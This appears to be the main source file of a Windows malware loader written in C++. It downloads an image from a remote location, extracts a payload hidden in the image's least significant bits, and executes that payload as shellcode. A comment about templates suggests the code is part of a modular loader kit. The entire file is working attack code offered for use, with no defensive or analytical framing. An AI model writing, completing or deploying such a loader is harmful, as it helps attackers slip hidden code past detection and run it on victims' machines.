#include "runner.h"

int wmain(int argc, wchar_t** argv) {
    if (argc == 3) {      
        // Init Gdiplus
        GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

        // Do the job
        const wchar_t* location = argv[1];
        int payload_size = _wtoi(argv[2]);

        // TEMPLATES GO HERE
        auto img = ImageSources::HttpX();
        Bitmap* bmp = img.Load(location);


        auto alg = Algorithms::LSB();
        uint8_t* payload_data = alg.Read(bmp, payload_size);


        auto pld = Payloads::Shellcode();
        pld.Run(payload_data, payload_size);

        // Shutdown Gdiplus
        GdiplusShutdown(gdiplusToken);
    }
    return 0;
}